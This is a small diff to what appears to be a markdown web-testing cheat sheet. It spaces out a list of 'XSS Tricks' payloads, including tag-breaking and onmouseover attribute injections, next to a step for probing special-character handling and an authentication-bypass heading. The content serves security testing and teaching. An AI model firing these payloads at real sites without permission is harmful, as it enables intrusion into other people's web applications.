@@ -41,10 +41,15 @@ cookie: id=eccbc87e4b5ce2fe28308fd9f2a7baf3
 3. Figure out how special characters are handled: Input something like `'<>:;"`
 
 **XSS** Tricks
+
 `"><h1>test</h1>`
+
 `'+alert(1)+'`
+
 `"onmouseover="alert(1)`
+
 `http://"onmouseover="alert(1)`
+
 
 ## Authentation Bypass Technique
 
